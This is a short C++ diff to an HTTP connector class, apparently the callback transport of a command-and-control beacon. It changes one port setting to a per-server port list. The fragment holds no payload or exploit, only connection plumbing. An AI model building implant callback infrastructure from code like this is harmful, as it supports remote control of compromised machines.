@@ -109,7 +109,7 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 	this->headers        = HttpHeaders;
 	this->server_count   = profile.servers_count;
 	this->server_address = (CHAR**) profile.servers;
-	this->server_port    = profile.port;
+	this->server_ports   = profile.ports;
 	this->ssl            = profile.use_ssl;
 	this->http_method    = (CHAR*) profile.http_method;
 	this->uri            = (CHAR*) profile.uri;
@@ -138,7 +138,7 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 		if ( this->hInternet ) {
 
 			if ( !this->hConnect )
-				this->hConnect = this->functions->InternetConnectA( this->hInternet, this->server_address[this->server_index], this->server_port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context );
+				this->hConnect = this->functions->InternetConnectA( this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context );
 
 			if ( this->hConnect )
 			{
